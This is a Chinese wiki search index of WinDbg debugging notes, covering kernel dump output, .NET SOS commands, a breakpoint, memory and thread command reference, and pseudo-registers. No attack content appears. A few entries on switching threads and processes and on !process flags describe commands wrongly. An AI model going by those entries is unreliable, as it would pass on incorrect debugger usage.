C:\\Windows\\SYSTEM32\\IPHLPAPI.DLL 7ffe57a20000 aa9c8581 Sep 14 18:48:33 2060 C:\\Windows\\System32\\NSI.dll 7ffe54a00000 752d58d6 Apr 18 21:02:14 2032 c:\\windows\\system32\\fwbase.dll 7ffe55720000 409dec87 May 09 16:32:07 2004 C:\\Windows\\SYSTEM32\\WLDP.DLL 7ffe56830000 15fd8d3b Sep 10 10:51:39 1981 C:\\Windows\\System32\\advapi32.dll 7ffe1e2c0000 1ef1f3ef Jun 15 06:45:03 1986 C:\\Windows\\SYSTEM32\\VbsApi.dll 7ffe1e280000 873e8a3a Nov 26 04:06:18 2041 C:\\Windows\\SYSTEM32\\SecurityCenterBroker.dll 7ffe56520000 ad1aff4d Jan 12 01:54:21 2062 C:\\Windows\\System32\\CRYPT32.dll 7ffe55f90000 3327e4fa Mar 13 19:28:58 1997 C:\\Windows\\System32\\WINTRUST.dll 7ffe558a0000 9dcceb6f Nov 23 03:28:47 2053 C:\\Windows\\SYSTEM32\\MSASN1.dll 7ffe56a40000 db9f728a Oct 05 20:37:30 2086 C:\\Windows\\System32\\clbcatq.dll 7ffe56db0000 f963cc3a Aug 04 00:52:10 2102 C:\\Windows\\System32\\OLEAUT32.dll 7ffe4a290000 d22ad5a9 Sep 25 18:42:49 2081 C:\\Windows\\system32\\wbem\\wbemprox.dll 7ffe57ca0000 aff3315b Jul 18 10:18:03 2063 C:\\Windows\\System32\\WS2_32.dll 7ffe4a200000 18d25282 Mar 14 04:54:26 1983 C:\\Windows\\SYSTEM32\\wbemcomn.dll 7ffe46290000 ee86f561 Oct 23 17:14:09 2096 C:\\Windows\\system32\\wbem\\wbemsvc.dll 7ffe46370000 9d244220 Jul 18 05:05:36 2053 C:\\Windows\\system32\\wbem\\fastprox.dll 7ffe45f80000 690ba034 Nov 06 03:06:28 2025 C:\\Windows\\SYSTEM32\\amsi.dll 7ffe55c80000 fa786637 Mar 01 20:14:47 2103 C:\\Windows\\SYSTEM32\\USERENV.dll 7ffe55cc0000 e5f6eb70 Apr 05 00:23:12 2092 C:\\Windows\\SYSTEM32\\profapi.dll 7ffe45f00000 abeb5625 May 26 17:55:49 2061 C:\\ProgramData\\Microsoft\\Windows Defender\\Platform\\4.18.23080.2006-0\\MpOav.dll 7ffe56f20000 8c6c47c7 Aug 27 18:28:23 2044 C:\\Windows\\System32\\ole32.dll 7ffe4c2d0000 14531102 Oct 21 22:56:02 1980 C:\\Windows\\system32\\version.dll 7ffe4f9e0000 70a9de78 Nov 24 10:12:08 2029 c:\\windows\\system32\\WINHTTP.dll 7ffe55c40000 c6cd965c Sep 11 01:29:00 2075 C:\\Windows\\System32\\sspicli.dll 7ffe546a0000 c156fd2a Oct 15 04:46:34 2072 C:\\Windows\\SYSTEM32\\gpapi.dll 7ffe467c0000 c8c52eef Sep 27 01:10:07 2076 C:\\Windows\\System32\\SecurityCenterBrokerPS.dll SubSystemData: 0000000000000000 ProcessHeap: 00000264d3ca0000 ProcessParameters: 00000264d3e03300 CurrentDirectory: &#x27;C:\\Windows\\system32\\&#x27; WindowTitle: &#x27;C:\\Windows\\System32\\svchost.exe&#x27; ImageFile: &#x27;C:\\Windows\\System32\\svchost.exe&#x27; CommandLine: &#x27;C:\\Windows\\System32\\svchost.exe -k LocalServiceNetworkRestricted -p&#x27; DllPath: &#x27;&lt; Name not readable &gt;&#x27; Environment: 00000264d3e027f0 ALLUSERSPROFILE=C:\\ProgramData APPDATA=C:\\Windows\\ServiceProfiles\\LocalService\\AppData\\Roaming CommonProgramFiles=C:\\Program Files\\Common Files CommonProgramFiles(x86)=C:\\Program Files (x86)\\Common Files CommonProgramW6432=C:\\Program Files\\Common Files COMPUTERNAME=DESKTOP-IMFKJGI ComSpec=C:\\Windows\\system32\\cmd.exe DriverData=C:\\Windows\\System32\\Drivers\\DriverData LOCALAPPDATA=C:\\Windows\\ServiceProfiles\\LocalService\\AppData\\Local NUMBER_OF_PROCESSORS=2 OS=Windows_NT Path=C:\\Windows\\system32;C:\\Windows;C:\\Windows\\System32\\Wbem;C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\;C:\\Windows\\System32\\OpenSSH\\;C:\\Windows\\ServiceProfiles\\LocalService\\AppData\\Local\\Microsoft\\WindowsApps PATHEXT=.COM;.EXE;.BAT;.CMD;.VBS;.VBE;.JS;.JSE;.WSF;.WSH;.MSC PROCESSOR_ARCHITECTURE=AMD64 PROCESSOR_IDENTIFIER=Intel64 Family 6 Model 158 Stepping 9, GenuineIntel PROCESSOR_LEVEL=6 PROCESSOR_REVISION=9e09 ProgramData=C:\\ProgramData ProgramFiles=C:\\Program Files ProgramFiles(x86)=C:\\Program Files (x86) ProgramW6432=C:\\Program Files PSModulePath=%ProgramFiles%\\WindowsPowerShell\\Modules;C:\\Windows\\system32\\WindowsPowerShell\\v1.0\\Modules PUBLIC=C:\\Users\\Public SystemDrive=C: SystemRoot=C:\\Windows TEMP=C:\\Windows\\SERVIC~1\\LOCALS~1\\AppData\\Local\\Temp TMP=C:\\Windows\\SERVIC~1\\LOCALS~1\\AppData\\Local\\Temp USERDOMAIN=NT AUTHORITY USERNAME=LOCAL SERVICE USERPROFILE=C:\\Windows\\ServiceProfiles\\LocalService windir=C:\\Windows 查看W32PROCESS12345678910111213141516171819202122232425262728291: kd&gt; dt win32k!_W32PROCESS ffffb98ae4682300 +0x000 Process : 0x00000000`00000003 _EPROCESS +0x008 RefCount : 0xe4665b60 +0x00c W32PF_Flags : 0xffffb98a +0x010 InputIdleEvent : 0xffffb98a`e7946f40 _KEVENT +0x018 StartCursorHideTime : 0xe4682318 +0x020 NextStart : 0xffffb98a`e4682318 _W32PROCESS +0x028 pDCAttrList : 0x00000000`2ffdd002 Void +0x030 pBrushAttrList : 0xffffb98a`e45f5378 Void +0x038 W32Pid : 0xe4064378 +0x03c GDIHandleCount : 0n-18038 +0x040 GDIHandleCountPeak : 0 +0x044 UserHandleCount : 0n0 +0x048 UserHandleCountPeak : 0 +0x050 GDIPushLock : _EX_PUSH_LOCK +0x058 GDIEngUserMemAllocTable : _RTL_AVL_TABLE +0x0c0 GDIDcAttrFreeList : _LIST_ENTRY [ 0x00000000`00000000 - 0x00000000`00000000 ] +0x0d0 GDIBrushAttrFreeList : _LIST_ENTRY [ 0x00000000`00000000 - 0x00000000`00000000 ] +0x0e0 GDIW32PIDLockedBitmaps : _LIST_ENTRY [ 0x00000000`00000000 - 0x00000000`00000000 ] +0x0f0 hSecureGdiSharedHandleTable : (null) +0x0f8 DxProcess : (null) +0x100 DCompositionProcess : (null) +0x108 UMPDSandboxingEnabled : 0 +0x110 pWakeReference : (null) +0x118 defaultDpiContext : 0 +0x11c Dpi : 0 +0x120 bChangedGdiGammaRamp : 0y0 +0x120 bReadScreenBits : 0y0 +0x120 bWroteScreenBits : 0y0 参考文献 《深入解析windows操作系统 第6版》"},{"title":"【调试技术】.NET 调试","date":"2024-04-17T07:58:01.700Z","path":"wiki/调试技术/【调试技术】.NET 调试.html","text":"概述：使用 windbg 调试 .NET 文件，虽然使用windbg是必须的技能，但是非必要情况下可以使用 dnSpy调试。 以 C# 如下所示的代码为例： 123456789101112131415161718namespace DnrspEngine.Hooks.System&#123; class Win32Native &#123; [StructLayout(LayoutKind.Sequential)] internal class SECURITY_ATTRIBUTES &#123; &#125; internal static SafeFileHandle MySafeCreateFile(string lpFileName, int dwDesiredAccess, FileShare dwShareMode, SECURITY_ATTRIBUTES securityAttrs, FileMode dwCreationDisposition, int dwFlagsAndAttributes, IntPtr hTemplateFile) &#123; &#125; internal static SafeFileHandle PxySafeCreateFile(string lpFileName, int dwDesiredAccess, FileShare dwShareMode, SECURITY_ATTRIBUTES securityAttrs, FileMode dwCreationDisposition, int dwFlagsAndAttributes, IntPtr hTemplateFile) &#123; &#125; &#125;&#125; 命名空间 DnrspEngine.Hooks.System 有一个类 Win32Native。 调试 .Net 程序前，需要加载 SOS 扩展，SOS (Son of Strike) 是 .NET 调试的扩展，它提供了很多用于调试 .NET 应用程序的命令。首先，你需要加载 SOS 扩展： 1.loadby sos clr 0x01 查看函数地址!name2ee 查看类信息，如果不知道有哪些类，可以使用 !DumpHeap 命令，如果要查看具体的对象具有的方法但是又没有源代码时，可以使用 dnSpy 这类的反编译工具。 1234567891011# 查看类的属性!name2ee DnrspEngine.dll!DnrspEngine.Hooks.System.Win32Native# 输出如下所示0:024&gt; !name2ee DnrspEngine.dll!DnrspEngine.Hooks.System.Win32NativeModule: 00007ffd79051810Assembly: DnrspEngine, Version=1.0.0.1031, Culture=neutral, PublicKeyToken=nullToken: 000000000200000bMethodTable: 00007ffd79054540EEClass: 00007ffd792da338Name: DnrspEngine.Hooks.System.Win32Native 输出分析，以我当前要使用的字段为主： Module: 模块句柄 MethodTable：方法表。给出了我们对应的类的方法表的地址 !DumpHeap!DumpHeap 命令用于查看当前调试的进程的堆上的对象，略微局限 -stat：只输出堆上所有类型对象的统计摘要，包括它们的计数、大小和类型名称。这个选项非常有用，可以快速了解堆上对象的分布情况。 -nostrings：排除字符串的输出。当与 -stat 一起使用时，这个选项可以使得输出更加简洁，专注于非字符串类型的对象。 -gen X：仅输出属于指定代的对象。在 .NET 中，对象根据它们的生命周期被分配到不同的代（Generation），这个选项允许你查看特定代的对象。 -min X 和 -max X：忽略小于或大于指定字节大小的对象。这两个选项可以帮助你过滤掉不感兴趣的小对象或大对象。 -mt MethodTable：仅列出具有指定 MethodTable 的对象。MethodTable 是 .NET 中用于描述类型的内部结构。 -type type：仅列出类型名为指定子字符串的对象。这个选项允许你按类型名称过滤输出。 -live：仅输出仍然存活的对象，即那些还没有被垃圾回收器标记为可回收的对象。 -dead：仅输出已死亡的对象，这些对象将在下一次完全垃圾回收（Full GC）中被回收。 -cache：将对象保存在内部缓存中以供以后使用，这有助于加快后续扫描堆的速度。 -lx：只打印每个堆中的指定数量的项，而不是所有对象。这可以帮助你限制输出的数量。 -short：仅打印出对象的地址。这个选项通常与其他命令（如 .foreach）组合使用，用于自动化处理或进一步分析。 0x02 查看方法有哪些!dumpmt 查看方法有哪些 12345678910111213141516171819202122232425!dumpmt -md %MethodTable% # 查看方法有哪些---------------------------------------!dumpmt -md 00007ffd79054540# 输出如下所示：0:024&gt; !dumpmt -md 00007ffd79054540EEClass: 00007ffd792da338Module: 00007ffd79051810Name: DnrspEngine.Hooks.System.Win32NativemdToken: 000000000200000bFile: DnrspEngine, Version=1.0.0.1031, Culture=neutral, PublicKeyToken=nullBaseSize: 0x18ComponentSize: 0x0Slots in VTable: 7Number of IFaces in IFaceMap: 0--------------------------------------MethodDesc Table Entry MethodDesc JIT Name00007ffdd5c957a0 00007ffdd579c7a0 PreJIT System.Object.ToString()00007ffdd5d0d2b0 00007ffdd5935560 PreJIT System.Object.Equals(System.Object)00007ffdd5cfaba0 00007ffdd5935588 PreJIT System.Object.GetHashCode()00007ffdd5d0aac0 00007ffdd5935590 PreJIT System.Object.Finalize()00007ffd79159448 00007ffd79054538 NONE DnrspEngine.Hooks.System.Win32Native..ctor()00007ffd792e1440 00007ffd79054518 JIT DnrspEngine.Hooks.System.Win32Native.MySafeCreateFile(System.String, Int32, System.IO.FileShare, SECURITY_ATTRIBUTES, System.IO.FileMode, Int32, IntPtr)00007ffd792e1810 00007ffd79054528 JIT DnrspEngine.Hooks.System.Win32Native.PxySafeCreateFile(System.String, Int32, System.IO.FileShare, SECURITY_ATTRIBUTES, System.IO.FileMode, Int32, IntPtr) 输出分析： 可以看到输出内容是比较多的，并且输出了方法表示以及各个方法对应的地址。这里就可以对函数下断点了，以 DnrspEngine.Hooks.System.Win32Native.MySafeCreateFile 为例 （注意只有 JIT 的函数才可以下断点） 0x03 添加断点123456!bpmd -md 00007ffd79054518# 输出如下所示：0:024&gt; !bpmd -md 00007ffd79054518MethodDesc = 00007ffd79054518Setting breakpoint: bp 00007FFD792E1440 [DnrspEngine.Hooks.System.Win32Native.MySafeCreateFile(System.String, Int32, System.IO.FileShare, SECURITY_ATTRIBUTES, System.IO.FileMode, Int32, IntPtr)] 分析： 可以看到断点设置信息，已经函数参数等。等待函数执行就可以触发断点。 0x04 查看堆栈1234567!clrstack # 查看所有线程的堆栈!dumpstack#或者~*e!dumpstack 添加初始断点123450:000&gt; sxe ld:clrjit0:000&gt; .load C:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\sos.dll0:000&gt; .load C:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\clr.dll0:000&gt; .loadby sos clr （等同于上面两条命令） 0x06 其他命令补充 帮助命令 1!help 清屏 1!cls 查看当前托管线程已执行时间 1!runaway 查看当前线程池情况 1!threadpool"},{"title":"【调试技术】Windbg 插件","date":"2024-04-25T16:00:00.000Z","path":"wiki/调试技术/【调试技术】Windbg 插件.html","text":"概述：windbg 插件"},{"title":"Windbg 基础命令","date":"2024-04-28T06:47:17.767Z","path":"wiki/调试技术/【调试技术】Windbg基础命令.html","text":"本文介绍windbg中的一些基础命令： [toc] 基础命令 说明 命令 用法 描述 说明 命令 用法 描述 帮助 ? ?? 表达式 显示常规命令计算表达式的值 .help .help 显示元命令(以 . 开头的命令) .hh .hh.hh bp 打开windbg help文档打开windbg help文档，并自动输入bp命令进行搜索 版本 version 显示调试器和调试目标版本 vercommand 显示调试器启动时的命令行 vertarget 显示调试目标系统信息 清空屏幕 .cls 查看异常信息 .ecxr 显示异常信息的上下文 .lastevent 显示最近一次发生的异常信息或事件 .exr -1 显示最近一次的异常记录 !analyze !analyze -v!analyze -hang!analyze -f 显示当前异常信息分析线程栈，看是否有线程blocking其他线程See an exception analysis even when the debugger does not detect an exception. 寄存器 r 显示各寄存器的值 时间 .time 显示system&#x2F;process&#x2F;kernel&#x2F;user time Switch between 32-bit and 64-bit mode !wow64exts.sw.load wow64exts 查看64位机器上生成的32位程序的dmp时，需要使用此命令转换一下模式!wow64exts.help 可查看相关帮助信息 调试命令 命令 说明 示例 g 继续执行 gu 执行到当前函数返回 step out p 单步调试 step over t step into q 结束调试会话&#x2F;退出 .restart 重新启动调试目标 .detach 分离调试目标 .attach 附加到存在的进程，参数为16进制的PID .attach 0x123 .create 创建一个新的进程进行调试 例如调试cmd.exe.create cmd .dbgdbg 启动另一个调试器来调试当前调试器 .opendump 打开dmp文件 .opendump d:\\dump\\360tray.dmp 模块信息 命令 说明 lm 显示加载的模块信息，exe和dll等 lmvm 模块名lm v m 模块名 查看指定模块详细信息，比如查看360tray.exe中加载的appd.dll的信息示例： lmvm appd 调试符号 命令 说明 示例 ld 加载模块的调试符号 ld appdld * ln 搜索相邻符号（距离指定地址最近的符号） ln 722d0000 x 显示匹配参数类型的符号 显示kernel32.dll所有以Create开头的符号x kernel32!Create* .sympath 设置符号文件路径 .sympath d:\\dump .symfix 设置系统符号存放位置 设置系统符号存放位置 .reload Reload symbol information for all modules** 进程 命令 说明 示例 .process 显示当前进程的EPROCESS !process EPROCESS 查看某个线程 !process 0 0 查看系统当前所有进程 线程 命令 说明 示例 ~ 显示所有线程信息 * [Command]. [Command]~#[Command] 为所有线程执行指定命令为当前线程执行指定命令为导致当前异常或调试事件的线程执行指定命令 查看所有线程的栈信息：~* k Number Number s 显示序号为Number的线程切换当前线程为序号Number的线程 显示10号线程：10切换到10号线程： 10 s ~~[TID] 线程ID为TID的线程 ~ Number n~ Number m SuspendThread 增加线程的挂起计数ResumeThread 减少线程的挂起计数 ~ 10 n~10 m ~ Number f~ Number u Freeze thread 冻结线程Unfreeze thread 解冻线程控制被调试的线程的冻结状态, 与上面两个命令类似（处于冻结状态时恢复目标执行时这个线程不会恢复执行，这个状态是调试器维护的一个状态，执行~ 线程号 n 增加挂起计数后，执行g运行时该线程也不会运行） ~ Number s 在恢复执行命令g前加线程限定符，可以只恢复指定的线程执行（只对该线程调用ResumeThread使其恢复执行，其他线程仍处于挂起状态） !runaway 显示每个线程运行时间，可以方便找到消耗cpu时间长的线程 .ttime display thread times (user + kernel mode) !gle!gle -all displays the last error value for the current thread -&gt;GetLastErrordisplays the last error value for all threads !error decodes and displays information about an error value.Specifies one of the following error codes:Win32WinsockNTSTATUSNetAPI 栈 命令 说明 示例 k 显示EBP，返回地址和源文件信息（如果有私有符号的话） kb 显示EBP，返回地址，函数参数及源文件信息（如果有私有符号的话） k L L选项表示不显示源文件信息，也可以用于其他命令比如 kb L， kv L或写为 kL，kbL，kvL kv 在kb的基础上增加显示FPO（栈指针省略）信息和调用协议（调用协议仅支持On x86-based processors） kpkP 根据私有符号文件中的函数原型信息自动显示参数信息P为大写，表示每个参数占一行 kn 在k命令的基础上，每行前显示栈帧的序号 kn f f选项表示显示每两个相邻栈帧的内存距离，即栈帧基地址的差值 查看&#x2F;修改&#x2F;搜索内存数据 说明 命令 描述 示例 查看内存数据 命令格式：d{a|b|c|d|D|f|p|q|u|w|W} [Options] [Range]dy{b|d} [Options] [Range]d [Options] [Range] da ASCII字符 Range指定要显示的内存范围，有如下几种表示方法：起始地址+终止地址比如：dd 0012fd9c 0012fda8起始地址+L&#x2F;l+元素个数比如：dd 0012fd9c L4 或 dd 0012fd9c l4终止地址+L&#x2F;l+负号+元素个数比如：dd 0012fda8 L-4 或 dd 0012fda8 l-4 du Unicode字符 dc DWORD和ASCII码 dd DWORD dD 双精度浮点数 df 单精度浮点数 dp 指针 dq 四字&#x2F;8字节 dw 一个字&#x2F;2字节 查看局部变量dv [Flags] [Pattern] dv 查看局部变量 dv 02sample!gGlo*dv命令可以带有通配符, 来查看具有某命名模式的变量. dv &#x2F;i 查看局部变量, 并显示符号的类型和参数类型. dv &#x2F;t 查看局部变量, 并显示每个局部变量的数据类型 dv &#x2F;V 查看局部变量, 并显示变量的存储位置 dv &#x2F;V VariableName 查看指定名称的变量 查看复合类型变量 dt Display Type的缩写. 当变量的类型为复合类型, 比如说结构体或者类, 那么dv命令只会显示变量的地址. dt命令可以将一块内存按照某个数据类型来解析, 其中的数据类型需要作为参数被传递给dt命令.-b：递归显示所有子类型-r ：指定显示深度，-r0表示不显示子类型-y：附加搜索选项，只显示某个匹配的字段 编辑内存数据 按字符串方式编辑命令格式：e{a|u|za|zu} Address “String” 其中a和u分别代表不是以0结尾的ASCII和Unicode字符串，za和zu分别代表以0结尾的ASCII和Unicode字符串 ezu 12fc94 “Debug” 修改0012fc94地址的内容为Unicode字符串”Debug” 按数值方式编辑命令格式：e{b|d|D|f|p|q|w} Address [Values] Values指定新的值，如果命令中没有指定该值，则Windbg会以交互式方式让用户输入 ew 12fc94 41 41 41 41 41 将0012fc94地址开始的5个WORD都改为0x41 搜索内存数据 指定范围搜索任何ANSII或UNICODE字符串命令格式：s -[[Flags]] sa|su Range [Flags]用来指定搜索选项：L&#x2F;l+整数 指定字符串的最小长度s 将搜索结果保存起来r 在保存的结果中搜索 Range指定内存范围，写法与d命令的Range参数一样 s -[L5] sa poi(nt!PsInitialSystemProcess) L200在nt!PsInitialSystemProcess变量所指地址开始的512字节（0x200）范围内搜索任何长度不小于5的ANSII字符串 指定内存地址范围内搜索与指定对象相同类型的对象命令格式：s -[[Flags]]v Range Object Object ： Specifies the address of an object or the address of a pointer to an object 指定范围内搜索某一内容模式命令格式：s -[[[Flags]Type]] Range Pattern Type指定要搜索内容的数据类型，即决定匹配搜索内容的方式。取值可以为：b（字节），w（字），d（双字），q（四字），a（ASCII字符串），u（Unicode字符串）。如果不指定，默认为b。 Pattern指定要搜索的内容 s -u 0x400000 L2a000 “AdvDbg”从0x400000开始的2a000范围内搜索Unicode字符串”AdvDbg” 在当前进程的所有模块中进行搜索!for_each_module s-a @#Base @#End “Debugger” 在每个模块中搜索字符串” Debugger”其中@#Base和@#End是!for_each_module定义的别名，其他的还有：@#ModuleName（模块名称），@#SymbolFileName（符号文件名称），@#Size（模块大小），@#SymbolType（符号文件类型） 设置断点 命令 说明 示例 命令 说明 示例 bp 设置断点命令格式： bp[ID号] [Options] [Address [第几次命中断点时中断到调试器]] [“一组命令，用分号隔开”] Options选项可用的值：&#x2F;1 断点被命中一次后自动删除，即一次命中断点&#x2F;p 只用于内核调试中，&#x2F;p后跟一个EPROCESS结构的地址，即对指定的进程设置断点&#x2F;t 只用于内核调试中，&#x2F;t后跟一个ETHREAD结构的地址，即对指定的线程设置断点&#x2F;c 和 &#x2F;C 指定中断给用户的最大函数调用深度和最小函数调用深度举例：bp &#x2F;c5 MSVCR80D!printf 只有当函数调用栈深度浅于5时才中断。 Address表达方式：使用模块名加函数符号：bp LocalVar!FuncC 或带偏移值 bp LocalVar!FuncC+9直接使用内存地址：bp 00401089如果使用完全的调试符号，调试符号中包含源代码行信息，可以用： bp｀模块名!XXX.cpp:行号｀ ， 其中｀为重音符号对于C++的类方法，可以使用类名双冒号(::)或双下划线(__)来连接类名和方法名： bp MyClass::MyMethod 或 bp MyClass__MyMethod 或 bp @@(MyClass::MyMethod) （1）bp LocalVar!FuncC+9 其中 LocalVar为模块名称，FuncC为函数名称，9为偏移 （2）bp 00401089 在指定的地址上下断点 （3）bp MSVCR80D!printf + 3 2 “kv; da poi(ebp+8)” 在printf的入口偏移3的地址处下断点(为了让建立栈帧的代码执行完)，当第2次命中断点时中断到调试器，并自动执行kv和da poi(ebp+8)命令。 其中，da poi(ebp+8)用来显示printf的第一个参数所指定的字符串。 bu 用于对尚未被加载模块中的代码设置断点命令格式： bu[ID号] [Options] [Address [第几次命中断点时中断到调试器]] [“一组命令，用分号隔开”] 对于调试动态加载模块的入口函数和初始化代码比较有用，比如对于即插即用设备的驱动程序。可以使用如下命令在入口函数处设置断点： bu MyDriver!DriverEntry bm 用于设置一批断点命令格式：bm [Options] SymbolPattern [第几次命中断点时中断到调试器] [“一组命令，用分号隔开”] bm命令要求目标模块的调试符号有类型信息，这通常需要私有符号文件，如果对公共符号文件的模块使用bm命令，会提示错误信息。解决这个问题的方法是使用 &#x2F;a 开关，强制针对所有匹配的符号设置断点，无论是数据还是代码，建议只有在确信所有符号是函数时才使用。 bm MSVCR80D!print* 对MSVCR80D中所有print开头的函数设置断点 ba 设置读，写，执行断点命令格式：ba[ID号] Access Size [Options] [Address [第几次命中断点时中断到调试器]] [“一组命令，用分号隔开”]其中Access指定触发断点的访问方式，Size指定访问的长度。 Access的取值如下：e 读取和执行指令时触发断点，即访问代码硬件断点r 读取和写入数据时触发断点w 写入数据时触发断点i 执行I&#x2F;O访问时触发断点 Size的取值如下：对于访问代码硬件断点，它的值应该为1对于x86系统，可以为1，2，4，分别表示1字节访问，字访问和双字访问对于x64系统，可以为1，2，4， 8对于安腾系统，可以为1 - 0x80000000间的任意2次方值 ba r1 0041717c 对地址0041717c的1字节访问，字访问和双字访问（读写）都会触发该断点 bl 列出当前所有断点 bc 断点号 删除断点 断点号可以使用*来通配所有断点，使用 - 来表示一个范围，或者使用逗号来指定多个断点号 bd 断点号 禁用断点 be 断点号 启用断点 sxe ld:[dll名称] 加载某个DLL时下断点 bu wininet!DllMain 与 sxe ld:wininet 效果相同bp kernel32!LoadLibraryW &#x2F;bp kernel32!LoadLibraryA sxe ld:wininet加载wininet时下断点sxe ld:* &#x2F; sxe ud:* 匹配所有DLL模块 sxe ud:[dll名称] 卸载某个DLL时下断点 查看句柄信息 命令 说明 示例 !handle 扩展显示目标系统中一个或所有进程拥有的句柄的信息 !handle 4 f 用’f’表示显示最详细的信息："},{"title":"【调试技术】windbg 随手记","date":"2024-04-28T08:44:55.429Z","path":"wiki/调试技术/【调试技术】Windbg随手记.html","text":"相关工具整理： API Monitor PCHunter工具 windbg 脚本 分析32位1.load wow64exts 设置PDB文件路径1srv*D:\\Symbols*https://msdl.microsoft.com/download/symbols 生成dump1.dump /ma C:\\dumps\\myapp.dmp 调试技巧 直接按回车可以执行上一条命令 使用分分号作为分隔符，可以在同一行输入多条命令 按上下方向键可以浏览和选择以前输入过的命令 当命令提示符显示为BUSY时，即使命令编辑框可以输入命令，但是这个命令也不会被马上执行，要等WinDBG恢复到空闲状态才能执行 使用Ctrl+Break 来终止一个长时间未完成的命令。如果使用KD或则CDB，那么用Ctrl+C 选择菜单-&gt;Edit_&gt;Write Window Text to File可以把之前敲过的所有命令记录到文件 伪寄存器WinDBG自动定义了很多伪寄存器。在命令行和命令文件中都可以使用伪寄存器。WinDBG会自动将其替换（展开）为合适的值。例如下面这个@$scopeip就是一个伪寄存器，它代表当前的eip指针。 下表列出了windbg所定义的部分寄存器(字典型知识，需要时查阅即可) 伪寄存器 含义 $ea 调试目标所执行上一条指令的有效地址 $ea2 调试目标所执行上一条指令的第二个有效地址 $exp 表达式评估器所评估的上一条表达式 $ra 当前堆栈的返回地址。这个在执行命令中特别有用。例如，g @$ra 将一直执行到返回地址处（虽然，对于“步出(stepping out)”当前函数gu (Go Up)是一个更加准备有效的方法）。 $ip 指令指针寄存器： x86 处理器：和 eip 相同 Itanium 处理器：涉及 iip（请看表后的注解） x64处理器：和rip相同 $eip 指令指针寄存器 $eventip 当前调试事件发生时的指令指针 $previp 上一事件的指令指针 $relip 与当前事件关联的指令指针 $scopeip 当前上下文的指令指针 $exentry 当前进程的入口地址 $retreg 首要的函数返回值寄存器 $retreg64 64位格式的首要函数返回寄存器 $csp 栈顶指针ESP $p 上一个内存显示命令所打印的第一个值 $proc 当前进程EPROCESS结构的指针 $thread 当前线程ETHREAD结构的指针 $peb 当前进程的进程环境块(PEB)的地址 $teb 当前线程的线程环境块(TEB)地址 $tpid 拥有当前线程的进程ID(PID) $tid 当前线程的线程ID $bpx X号断点的地址 $frame 当前栈帧的序号 $dbgtime 当前时间 $callret 使用.call命令调用的上一个函数的返回值 $ptrsize 调试目标所在系统的指针类型宽度 $pagesize 调试目标所在的系统的内存页字节数 命令整理? 0n 命令Windbg中的 ?0n 是一个命令，用来设置表达式的数制为十进制。具体来说，当你需要查看一个内存地址或者变量以十进制格式时，可以使用 ?0n 命令。 在Windbg中，数制的表示： 0x表示十六进制 0n表示十进制 0t表示八进制 0y表示二进制。 Windbg默认数制为十六进制。 切换线程在WinDbg中，可以使用以下命令来切换线程： ~ 命令：用于切换当前活动线程。例如，~0s将切换到线程ID为0的线程。 ~* 命令：用于切换到所有线程中的下一个线程。 ~[] 命令：用于切换到特定索引的线程。例如，~[3]s将切换到索引为3的线程。 请注意，使用这些命令时，要确保已经在调试会话中加载了适当的符号和源代码，并且已经打开了需要调试的进程和线程。 切换进程在WinDbg中，可以使用以下命令来切换进程： | 命令：用于切换当前活动进程。例如，|1s将切换到进程ID为1的进程。 ~* 命令：用于切换到所有进程中的下一个进程。 ~[] 命令：用于切换到特定索引的进程。例如，~[3]s将切换到索引为3的进程。 请注意，使用这些命令时，要确保已经在调试会话中加载了适当的符号和源代码，并且已经打开了需要调试的进程和线程。 !process 命令在Windows Debugger（WinDbg）中，!process命令用于显示有关特定进程或所有进程的信息，包括EPROCESS块。 该命令的语法随Windows版本的不同而有所不同。 在Windows NT 4.0中，它的语法如下： 1!process[Process[Flags]] 在Windows 2000中，它的语法如下： 1!process[/sSession] [Process[Flags]] 在Windows XP及更高版本中，它的语法如下： 1!process[/sSession] [/mModule] [Process[Flags]] 以上命令中的参数含义如下： /sSession（Windows 2000及之后）指定拥有给定进程的会话（session）。 /mModule（Windows XP及之后）指定拥有需要的进程的模块。 Process 指定目标机上某个进程的16进制地址或者进程ID。 Flags 是用于控制命令行为的标志位，例如，/d 用于显示完整的进程环境块，/c 用于显示完整的线程环境块等。 以上信息仅供参考，如需更多信息，建议咨询专业的技术人员。 !IDT在WinDbg中，!idt命令用于显示中断分配表（Interrupt Dispatch Table，简称IDT）中的中断服务例程（Interrupt Service Routine，简称ISR）。 该命令的语法为：!idt [IDT]，其中IDT是可选项，用于指定要显示的特定IDT。 如果未指定IDT，并且在没有指定-a选项的情况下，该命令将简短地显示目标机上所有处理器的IDT。 如果指定了-a选项，该命令将显示所有IDT的ISR。 如果需要获取该命令的帮助文本，可以在调试器命令窗口中使用!idt -?命令。 需要注意的是，该命令只能对x64或者x86目标机使用。"},{"title":"【调试技术】logexts","date":"2024-01-14T16:00:00.000Z","path":"wiki/调试技术/【调试技术】logexts.html","text":"概述：logexts 使用 官方文档：使用调试器和 Logexts.dll - Windows drivers | Microsoft Learn"},{"title":"【调试技术】分析实战","date":"2024-04-16T03:41:16.446Z","path":"wiki/调试技术/【调试技术】分析实战.html","text":"概述： windbg 分析实战，命令输出解析 [toc] 调试进程 双机调试下，调试进程要用到 !process 和 .process 命令，进入进程空间后，命令同用户态调试 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283848586878889909192939495969798991001011021031041051061071: kd&gt; !process fffffa800c5c8060 3PROCESS fffffa800c5c8060 SessionId: 0 Cid: 06fc Peb: 7fffffd4000 ParentCid: 025c DirBase: 1f8dfb000 ObjectTable: fffff8a0020a44e0 HandleCount: 281. Image: svchost.exe VadRoot fffffa800c5c8570 Vads 128 Clone 0 Private 2532. Modified 992. Locked 0. DeviceMap fffff8a001b400b0 Token fffff8a0020ac060 ElapsedTime 00:06:27.486 UserTime 00:00:00.046 KernelTime 00:00:00.093 QuotaPoolUsage[PagedPool] 94704 QuotaPoolUsage[NonPagedPool] 32760 Working Set Sizes (now,min,max) (4303, 50, 345) (17212KB, 200KB, 1380KB) PeakWorkingSetSize 4717 VirtualSize 57 Mb PeakVirtualSize 57 Mb PageFaultCount 6769 MemoryPriority BACKGROUND BasePriority 8 CommitCharge 2766 THREAD fffffa800c5d0060 Cid 06fc.0700 Teb: 000007fffffde000 Win32Thread: fffff900c075cc10 WAIT: (UserRequest) UserMode Non-Alertable fffffa800c3d96a0 SynchronizationEvent THREAD fffffa800c482060 Cid 06fc.0704 Teb: 000007fffffdc000 Win32Thread: 0000000000000000 WAIT: (UserRequest) 